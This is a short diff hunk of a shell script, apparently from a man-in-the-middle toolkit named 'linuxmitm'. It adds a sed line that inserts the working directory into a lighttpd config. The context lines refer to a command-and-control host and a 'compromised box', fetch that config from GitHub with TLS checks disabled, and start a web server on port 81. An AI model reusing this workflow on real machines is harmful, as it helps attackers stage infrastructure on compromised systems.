@@ -282,6 +282,7 @@ ls -l out
 # if you specify a CNC outside of the compromised box it will work fine.
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf
 echo "Starting lighttpd web server started on port 81"
+sed -i "s/PWD/$PWD/" lighttpd.conf
 
 lighttpd -f lighttpd.conf&
 
